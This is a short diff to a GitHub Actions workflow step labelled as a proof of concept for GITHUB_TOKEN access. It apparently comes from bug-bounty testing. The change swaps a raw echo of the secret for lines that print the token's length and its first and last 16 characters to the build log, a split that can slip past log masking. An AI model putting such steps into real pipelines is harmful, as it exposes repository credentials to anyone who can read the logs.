@@ -12,7 +12,9 @@ jobs:
 
       - name: Prove GITHUB_TOKEN Access (Obfuscated)
         run: |
-          TOKEN="${{ secrets.TEST_HACKERONE }}"
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
 
           echo "=== Proof of Concept ==="
-          echo "${{ secrets.GITHUB_TOKEN }}"
+          echo "Token length: ${#TOKEN}"
+          echo "Token prefix: ${TOKEN:0:16}****"
+          echo "Token suffix: ****${TOKEN: -16}"
